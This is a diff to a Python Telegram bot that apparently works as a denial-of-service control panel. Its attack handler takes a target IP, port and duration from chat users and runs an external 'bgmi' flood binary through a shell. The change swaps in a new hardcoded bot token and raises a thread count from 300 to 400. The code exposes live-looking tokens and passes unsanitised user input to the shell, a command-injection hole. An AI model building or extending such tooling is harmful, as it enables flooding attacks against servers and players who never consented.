@@ -12,7 +12,7 @@ from pytz import timezone
 logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('6921680287:AAEL2ojcHgaUpOd5Gtq0R6XBtYEEiJW7pd0')
+bot = telebot.TeleBot('7847011615:AAEvjlMotcw1GiyXXiJftflqO5g3EMf7bkM')
 
 # Owner and admin user IDs
 owner_id = "7289462173"
@@ -243,7 +243,7 @@ def handle_attack(message):
                 else:
                     user_last_attack[user_id] = time.time()
                     start_attack_reply(message, target, port, time_duration)
-                    full_command = f"./bgmi {target} {port} {time_duration} 300"
+                    full_command = f"./bgmi {target} {port} {time_duration} 400"
                     subprocess.run(full_command, shell=True)
 
                     response = f"🎯 **Attack Finished!**\n**Target:** `{target}`\n**Port:** `{port}`\n**Duration:** `{time_duration} seconds`"
